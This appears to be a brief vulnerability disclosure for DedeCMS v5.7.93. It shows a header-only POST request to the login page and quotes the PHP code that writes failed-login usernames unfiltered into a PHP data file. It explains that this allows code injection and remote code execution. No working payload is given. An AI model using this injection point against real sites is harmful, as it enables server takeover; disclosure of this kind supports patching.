## POC

```
POST /dede/login.php HTTP/1.1
Host: dedecms5793
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=e9ag7oevkh77gnko3cdmt7mbc2

```

## Details

DedeCMS v5.7.93 added the login failure lock function to the /dede/login.php file to comply with relevant web security regulations. When a user fails to login, the failure message will be written to the /data/login.data.php file to record the number of failed login attempts for that user.

The file write operation does not filter the write content sufficiently, allowing an attacker to write malicious code to the file by user name and cause remote code execution.

```php

$arr_login[$userid] = "{$count},{$timestamp}";
$content = "<?php\r\n\$str_login='" . json_encode($arr_login) . "';";

$fp = fopen($filename, 'w') or die("写入文件 $filename 失败，请检查权限！");
fwrite($fp, $content);
fclose($fp);
                
```
